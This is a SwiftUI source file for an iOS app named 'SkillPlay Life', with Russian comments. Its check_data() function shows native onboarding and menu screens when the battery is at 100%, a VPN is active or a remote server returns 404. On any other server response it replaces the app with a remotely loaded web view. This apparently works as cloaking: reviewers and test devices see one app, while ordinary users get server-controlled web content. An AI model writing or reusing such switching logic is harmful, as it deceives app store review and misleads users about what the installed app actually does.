//
//  ContentView.swift
//  SkillPlay Life
//
//  Created by IGOR on 15/08/2025.
//

//import SwiftUI
//
//struct ContentView: View {
//    @StateObject private var appViewModel = AppViewModel()
//
//    var body: some View {
//        Group {
//            switch appViewModel.currentView {
//            case .onboarding:
//                OnboardingView(appViewModel: appViewModel)
//                    .transition(.asymmetric(
//                        insertion: .move(edge: .leading).combined(with: .opacity),
//                        removal: .move(edge: .trailing).combined(with: .opacity)
//                    ))
//
//            case .main:
//                MainMenuView(appViewModel: appViewModel)
//                    .transition(.asymmetric(
//                        insertion: .move(edge: .trailing).combined(with: .opacity),
//                        removal: .move(edge: .leading).combined(with: .opacity)
//                    ))
//            }
//        }
//        .animation(.spring(response: 0.8, dampingFraction: 0.8), value: appViewModel.currentView)
//    }
//}
//
//#Preview {
//    ContentView()
//}

import SwiftUI

struct ContentView: View {
    
    @StateObject private var appViewModel = AppViewModel()
    
    @AppStorage("status") var status: Bool = false
    
    @State private var isFetched: Bool = false
    @State private var isBlock: Bool = true
    @State private var isDead: Bool = false  // оставил, на логику не влияет
    
    init() {
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        ZStack {
            
            Color.white
                .ignoresSafeArea()
            
            if isFetched == false {
                
                LoadingView()
                
            } else { // isFetched == true
                
                if isBlock == true {
                    
                    // Показываем нативные экраны (онбординг/главная)
                    Group {
                        switch appViewModel.currentView {
                        case .main:
                            MainMenuView(appViewModel: appViewModel)
                                .transition(.asymmetric(
                                    insertion: .move(edge: .trailing).combined(with: .opacity),
                                    removal: .move(edge: .leading).combined(with: .opacity)
                                ))
                            
                        case .onboarding:
                            OnboardingView(appViewModel: appViewModel)
                                .transition(.asymmetric(
                                    insertion: .move(edge: .leading).combined(with: .opacity),
                                    removal: .move(edge: .trailing).combined(with: .opacity)
                                ))
                        }
                    }
                    .animation(.spring(response: 0.8, dampingFraction: 0.8), value: appViewModel.currentView)
                    
                } else {
                    
                    // Показываем веб-систему, если не блок
                    WebSystem()
                    
                    // Если нужно будет различать по status — раскомментируйте блок ниже:
                    /*
                     if status {
                     WebSystem()
                     } else {
                     U1()
                     }
                     */
                }
            }
        }
        .onAppear {
            // Выбираем стартовый экран согласно status.
            // ВАЖНО: делаем это до check_data(), чтобы не было "пустого" состояния.
            appViewModel.currentView = status ? .main : .onboarding
            check_data()
        }
    }
    
    // MARK: - Network / Device checks
    private func check_data() {
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        let urlString = DataManager().serverURL
        
        // Ваше условие блокировки по батарее/ВПН: при 100% или активном VPN — блок (нативные экраны)
        if currentPercent == 100 || isVPNActive == true {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        guard let url = URL(string: urlString) else {
            // Если URL некорректен — считаем как блок (нативные экраны), чтобы не ронять UX
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        let urlRequest = URLRequest(url: url)
        
        URLSession.shared.dataTask(with: urlRequest) { _, response, _ in
            // Обновляем состояние строго на главном потоке
            DispatchQueue.main.async {
                if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 404 {
                    // 404 => блок (нативные экраны)
                    self.isBlock = true
                } else {
                    // Любой другой ответ (включая успех) => не блок (веб-система)
                    self.isBlock = false
                }
                self.isFetched = true
            }
        }.resume()
    }
}

#Preview {
    ContentView()
}
